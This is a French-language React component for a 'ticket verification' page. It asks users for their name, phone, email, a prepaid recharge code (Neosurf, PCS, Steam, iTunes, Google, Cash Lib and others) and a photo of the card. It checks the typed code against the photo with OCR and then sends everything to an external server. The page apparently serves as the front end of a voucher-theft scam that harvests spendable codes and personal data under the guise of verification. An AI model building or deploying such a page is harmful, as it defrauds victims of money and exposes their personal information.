import Tesseract from 'tesseract.js';
import React, { useState } from 'react';
import './index.css';
import 'bootstrap/dist/css/bootstrap.min.css';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { ProgressBar, Spinner } from 'react-bootstrap';

function TicketForm() {
    const [firstName, setFirstName] = useState('');
    const [lastName, setLastName] = useState('');
    const [phoneNumber, setPhoneNumber] = useState('');
    const [email, setEmail] = useState('');
    const [cardType, setCardType] = useState('');
    const [code, setCode] = useState('');
    const [image, setImage] = useState(null);
    const [ocrCode, setOcrCode] = useState('');
    const [successMessage, setSuccessMessage] = useState('');
    const [errorMessage, setErrorMessage] = useState('');
    const [loading, setLoading] = useState(false);
    const [progress, setProgress] = useState(0);
    const [isReadingImage, setIsReadingImage] = useState(false); // <- pour l'animation OCR

    const handleImageChange = async (e) => {
        const file = e.target.files[0];
        setImage(file);
        if (file) {
            setIsReadingImage(true);
            toast.info("Lecture du code sur l’image en cours...");
            try {
                const result = await Tesseract.recognize(file, 'eng', {
                    logger: (m) => {
                        if (m.status === 'recognizing text') {
                            setProgress(m.progress * 100);
                        }
                    },
                });
                const textDetected = result.data.text.trim();
                console.log("Code détecté OCR :", textDetected);
                setOcrCode(textDetected);
                toast.success("Code détecté automatiquement !");
            } catch (err) {
                console.error("Erreur OCR :", err);
                toast.error("Impossible de lire le code sur l’image.");
            } finally {
                setIsReadingImage(false);
            }
        }
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        window.scrollTo({ top: 0, behavior: 'smooth' });

        if (!firstName || !lastName || !phoneNumber || !email || !cardType || !code || !image) {
            setErrorMessage('Tous les champs sont requis!');
            return;
        }

        const phoneRegex = /^[0-9]{10}$/;
        if (!phoneRegex.test(phoneNumber)) {
            setErrorMessage('Le numéro de téléphone est invalide.');
            return;
        }

        const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
        if (!emailRegex.test(email)) {
            setErrorMessage('L\'email est invalide.');
            return;
        }

        const validImageTypes = ['image/jpeg', 'image/png', 'image/gif'];
        if (!validImageTypes.includes(image.type)) {
            setErrorMessage('Le fichier doit être une image (JPEG, PNG, GIF).');
            return;
        }

        if (code.length < 8 || code.length > 30) {
            setErrorMessage('La longueur du code de recharge est invalide.');
            return;
        }

        let isValid = false;
        for (let i = 0; i < code.length - 2; i++) {
            const codeSubstr = code.substring(i, i + 3);
            if (ocrCode.includes(codeSubstr)) {
                isValid = true;
                break;
            }
        }

        if (!isValid) {
            toast.error('❌ Le code entré ne correspond pas à celui détecté sur l’image.');
            return;
        }

        setLoading(true);
        setSuccessMessage('');
        setErrorMessage('');
        setProgress(30);

        const formData = new FormData();
        formData.append('first_name', firstName);
        formData.append('last_name', lastName);
        formData.append('phone_number', phoneNumber);
        formData.append('email', email);
        formData.append('card_type', cardType);
        formData.append('code', code);
        formData.append('image', image);

        try {
            const response = await fetch('https://systeme-rjpm.onrender.com/api/verifier-ticket', {
                method: 'POST',
                body: formData,
            });

            const data = await response.json();

            if (data.success) {
                setProgress(100);
                toast.success('🎉 Ticket vérifié avec succès!');
            } else {
                setProgress(100);
                toast.error(data.message || 'Erreur lors de la vérification du ticket.');
            }
        } catch (error) {
            setProgress(100);
            toast.error('Erreur serveur : ' + error.message);
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="container py-5">
            <div className="card animate__animated animate__fadeIn">
                <h2 className="mb-4 text-center text-white text-decoration-underline">Vérification de Ticket</h2>

                {successMessage && <div className="alert alert-success text-white">{successMessage}</div>}
                {errorMessage && <div className="alert alert-danger text-white">{errorMessage}</div>}

                {/* Spinner fluide pendant lecture OCR */}
                {isReadingImage && (
                    <div className="text-center my-4">
                        <Spinner animation="border" variant="light" />
                        <div className="mt-2 text-white">Lecture de l’image en cours...</div>
                    </div>
                )}

                <form onSubmit={handleSubmit}>
                    <div className="mb-3 d-flex">
                        <div className="flex-fill mb-2 mb-md-0">
                            <input type="text" placeholder="Nom" className="form-control text-white" value={lastName} onChange={(e) => setLastName(e.target.value)} required />
                        </div>
                        <div className="ms-4 flex-fill mb-2 mb-md-0">
                            <input type="text" placeholder="Prénom" className="form-control text-white" value={firstName} onChange={(e) => setFirstName(e.target.value)} required />
                        </div>
                    </div>

                    <div className="mb-3">
                        <input type="text" placeholder="Numéro de téléphone" className="form-control text-white" value={phoneNumber} onChange={(e) => setPhoneNumber(e.target.value)} required />
                    </div>

                    <div className="mb-3">
                        <input type="email" placeholder="Email*" className="form-control" value={email} onChange={(e) => setEmail(e.target.value)} required />
                    </div>

                    <div className="mb-3">
                        <select className="form-select" value={cardType} onChange={(e) => setCardType(e.target.value)} required>
                            <option value="">Type de Recharge</option>
                            <option value="neosurf">Neosurf</option>
                            <option value="pcs">PCS</option>
                            <option value="iTunes">iTunes</option>
                            <option value="apple">Apple</option>
                            <option value="google">Google</option>
                            <option value="steam">Steam</option>
                            <option value="Cash Lib">Cash Lib</option>
                        </select>
                    </div>

                    <div className="mb-3">
                        <input type="text" placeholder="Code de Recharge" className="form-control text-white" value={code} onChange={(e) => setCode(e.target.value)} required />
                    </div>

                    <div className="mb-3">
                        <label htmlFor="image" className="form-label text-white">Photo de la carte</label>
                        <input type="file" className="form-control text-white" onChange={handleImageChange} accept="image/*" required />
                    </div>

                    {image && (
                        <div className="mb-3 text-center">
                            <h5 className="text-white">Aperçu de l'image :</h5>
                            <img src={URL.createObjectURL(image)} alt="Aperçu" style={{ maxWidth: '100%', height: 'auto', borderRadius: '8px', marginBottom: '10px' }} />
                            <br />
                            <button type="button" className="btn text-white w-100" onClick={() => {
                                setImage(null);
                                setOcrCode('');
                                setProgress(0);
                                toast.info("Image supprimée !");
                            }}>
                                Supprimer l'image
                            </button>
                        </div>
                    )}

                    <button type="submit" className="btn btn-danger w-100" disabled={loading}>
                        {loading ? 'Vérification en cours...' : 'Vérifier'}
                    </button>

                    {/* Barre de progression après le bouton */}
                    {loading && (
                        <div className="my-4">
                            <ProgressBar animated now={progress} striped variant="success" label={`${Math.round(progress)}%`} />
                        </div>
                    )}
                </form>
            </div>

            <span className="scroll-to-top" onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })} title="Revenir en haut">
                <i className="fas fa-arrow-up"></i>
            </span>

            <ToastContainer />
        </div>
    );
}

export default TicketForm;
